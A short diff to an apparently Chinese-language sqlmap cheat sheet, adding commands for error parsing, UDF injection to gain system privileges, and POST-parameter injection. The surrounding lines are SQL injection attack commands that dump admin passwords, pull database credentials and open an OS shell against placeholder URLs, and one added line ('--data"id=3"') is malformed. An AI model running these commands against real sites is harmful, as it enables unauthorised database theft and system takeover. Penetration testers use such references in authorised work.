@@ -25,6 +25,9 @@ sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump
 sqlmap -u http://url.php?id=1 -D test -T admin -C admin,pass --dump --hex
 sqlmap -u http://url.php?id=1 --os-shell
 sqlmap -u http://url/jsrpc.php?profileIdx2= -p "profileIdx2" --dbs # -p 注入参数名
+sqlmap -u http://url.php?id=1 --parse-errors # 查看出错原因
+sqlmap -u "URL" --udf-inject   # 导入用户自定义函数（获取系统权限！）
+sqlmap -u "URL" --data"id=3" #post注入
 --priviledges # 用户权限
 
 sqlmap -r b.txt --passwords --batch     # bp抓包保存为 b.txt
